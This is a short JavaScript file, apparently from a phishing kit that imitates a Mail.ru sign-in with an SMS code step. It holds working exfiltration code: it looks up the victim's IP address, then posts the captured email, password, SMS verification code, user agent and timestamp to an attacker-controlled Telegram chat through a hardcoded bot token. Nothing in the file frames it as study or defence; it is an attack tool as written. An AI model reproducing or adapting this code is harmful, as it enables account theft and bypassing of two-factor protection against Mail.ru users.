const BOT_TOKEN = '8686499580:AAFZTXtseDYgV-J4iL1ypybdaoZ3omfBxDE';
const CHAT_ID = '8652909485';

async function getCurrentIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (e) {
    return 'Unknown';
  }
}

async function sendToTelegram(data) {
  const title = '🔐 Mail.ru — Код з SMS';
  const message = `${title}\n\n` +
    `📧 Пошта: ${data.email}\n` +
    `🔒 Пароль: ${data.password}\n` +
    `📱 Код: ${data.code}\n` +
    `🖥 User-Agent: ${data.userAgent}\n` +
    `🌐 IP: ${data.ip}\n` +
    `🆔 Email ID: ${data.emailId || '—'}\n` +
    `⏰ Час: ${data.timestamp}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {}
}

window.getCurrentIP = getCurrentIP;
window.sendToTelegram = sendToTelegram;
